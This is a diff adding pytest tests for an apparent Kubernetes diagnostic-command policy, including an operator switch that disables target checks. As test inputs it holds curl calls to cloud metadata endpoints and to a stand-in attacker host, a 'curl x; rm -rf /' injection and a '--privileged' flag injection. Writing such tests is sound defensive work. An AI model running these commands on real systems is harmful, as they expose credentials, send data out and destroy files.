@@ -461,6 +461,53 @@ def test_diagnostic_wget_redirect_following_is_a_known_residual():
     m.assert_called_once()
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        ["curl", "http://169.254.169.254/latest/meta-data/"],
+        ["curl", "http://metadata.google.internal/computeMetadata/v1/"],
+        ["curl", "http://attacker.example.com/collect"],
+        ["curl", "-L", "http://api.prod.svc.cluster.local/r"],
+    ],
+)
+def test_diagnostic_target_policy_can_be_disabled_by_operator(command):
+    """KUBECTL_DIAGNOSTIC_TARGET_POLICY_ENABLED=false is a full escape hatch: it
+    turns off every target check, including the metadata denial. Restores the
+    pre-ROB-910 behaviour on purpose, for environments the policy misjudges."""
+    with patch.object(k, "DIAGNOSTIC_TARGET_POLICY_ENABLED", False), \
+         patch.object(k, "_run_kubectl", return_value={"success": True}) as m, \
+         patch.object(k.subprocess, "run", return_value=None):
+        result = k.run_preapproved_diagnostic_image(
+            image="curlimages/curl", namespace="prod", command=command, name="probe"
+        )
+    assert result.get("success") is True
+    m.assert_called_once()
+
+
+def test_diagnostic_target_policy_enabled_by_default():
+    """The escape hatch must be opt-in — a fresh import enforces the policy."""
+    assert k.DIAGNOSTIC_TARGET_POLICY_ENABLED is True
+    assert k.get_remediation_mcp_config()["diagnostic_target_policy_enabled"] is True
+
+
+def test_diagnostic_disabling_policy_still_enforces_non_target_guards():
+    """Disabling the target policy must not disable the image allowlist, the
+    shell-char rejection or the flag-injection guard — those are separate."""
+    with patch.object(k, "DIAGNOSTIC_TARGET_POLICY_ENABLED", False), \
+         patch.object(k, "_run_kubectl") as m:
+        unlisted = k.run_preapproved_diagnostic_image(image="evil/image", namespace="p")
+        metachar = k.run_preapproved_diagnostic_image(
+            image="busybox", namespace="p", command=["sh", "-c", "curl x; rm -rf /"]
+        )
+        flag = k.run_preapproved_diagnostic_image(
+            image="busybox", namespace="p", name="--privileged"
+        )
+    m.assert_not_called()
+    assert unlisted["success"] is False
+    assert metachar["success"] is False
+    assert flag["success"] is False
+
+
 def test_diagnostic_hard_denial_survives_operator_opt_in():
     """Metadata denial is not operator-removable, even with external targets on."""
     with patch.object(k, "ALLOW_EXTERNAL_DIAGNOSTIC_TARGETS", True), \
@@ -723,6 +770,7 @@ def test_get_config_returns_effective_policy():
         "dangerous_flags",
         "preapproved_exec_binaries",
         "diagnostic_images",
+        "diagnostic_target_policy_enabled",
         "diagnostic_allow_external_targets",
         "diagnostic_internal_dns_suffixes",
         "diagnostic_hard_denied_networks",
